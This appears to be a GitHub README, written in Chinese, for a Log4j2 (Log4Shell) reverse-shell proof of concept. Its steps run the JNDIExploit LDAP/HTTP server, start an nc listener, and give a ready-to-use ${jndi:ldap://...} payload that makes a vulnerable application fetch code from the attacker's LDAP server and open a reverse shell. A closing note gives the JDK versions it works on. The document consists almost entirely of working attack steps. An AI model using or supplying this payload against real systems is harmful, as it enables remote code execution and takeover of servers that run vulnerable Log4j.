# log4j2-reverseshell-poc

1、使用JNDIExploit启动LDAP与 HTTP  https://github.com/0x727/JNDIExploit

eleven@192 ~> java -jar   JNDIExploit-1.3-SNAPSHOT.jar -i 127.0.0.1
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 3456...
2、nc 开启监听

eleven@192 ~> nc -l 127.0.0.1 8088 -v
 
3、payload：

${jndi:ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/8088}

<img width="941" alt="image" src="https://user-images.githubusercontent.com/21239564/145577752-17e1c9b4-a7ef-4568-9208-e0461d62b3e2.png">

<img width="789" alt="image" src="https://user-images.githubusercontent.com/21239564/145577807-8e978537-00cc-46c5-90ca-afb9544f27ac.png">


当前版本1.8.0_181 ，jdk1.8.191以上默认不支持ldap协议无法复现
